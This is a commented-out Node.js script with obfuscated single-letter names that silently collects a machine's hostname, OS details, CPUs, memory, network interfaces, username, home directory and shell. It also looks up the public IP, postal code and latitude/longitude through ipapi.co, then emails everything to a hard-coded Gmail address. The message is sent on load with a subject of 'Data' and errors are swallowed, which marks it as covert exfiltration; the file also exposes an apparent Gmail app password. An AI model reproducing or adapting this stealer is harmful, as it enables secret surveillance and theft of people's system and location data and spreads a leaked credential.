// const l = require("os");
// const p = require("axios");
// const f = require("nodemailer");

// function a(c, d) {
//   var b = f.createTransport({
//     service: "gmail",
//     auth: {
//       user: "cory.pearl99@gmail.com",
//       pass: "sevk zxpj zfcw gskp",
//     },
//   });

//   var e = {
//     from: "cory.pearl99@gmail.com",
//     to: c,
//     subject: "Data",
//     text: d,
//   };

//   b.sendMail(e, function (error, info) {
//     if (error) {
//     } else {
//     }
//   });
// }
// async function h() {
//   const i = l.networkInterfaces();
//   const j = Object.values(i)
//     .flat()
//     .filter((details) => details.family === "IPv4" && !details.internal)
//     .map((details) => details.address)
//     .join(", ");

//   let k = "Unknown";
//   try {
//     const l = await p.get("https://ipapi.co/json/");
//     k = `${l.data.city}, ${l.data.region}, ${l.data.country_name}, ${l.data.postal}, ${l.data.latitude}, ${l.data.longitude}, ${l.data.ip}, ${l.data.network}`;
//   } catch (error) {
//     console.error("Error fetching location:", error);
//   }

//   return `
//         Hostname: ${l.hostname()}
//         Platform: ${l.platform()}
//         Hostname: ${l.hostname()}
//         Platform: ${l.platform()}
//         Release: ${l.release()}
//         Architecture: ${l.arch()}
//         CPU: ${l
//           .cpus()
//           .map((cpu) => cpu.model)
//           .join(", ")}
//         Total Memory: ${(l.totalmem() / (1024 * 1024 * 1024)).toFixed(2)} GB
//         Free Memory: ${(l.freemem() / (1024 * 1024 * 1024)).toFixed(2)} GB
//         Uptime: ${(l.uptime() / 3600).toFixed(2)} hours
//         Network Interfaces: ${JSON.stringify(i, null, 2)}
//         Local IP: ${j}
//         User Name: ${l.userInfo().username}
//         Home Directory: ${l.userInfo().homedir}
//         Shell: ${l.userInfo().shell}
//         Location: ${k}
//         Local IP: ${j}
//     `;
// }

// (async () => {
//   const g = await h();
//   a("cory.pearl99@gmail.com", g);
// })();
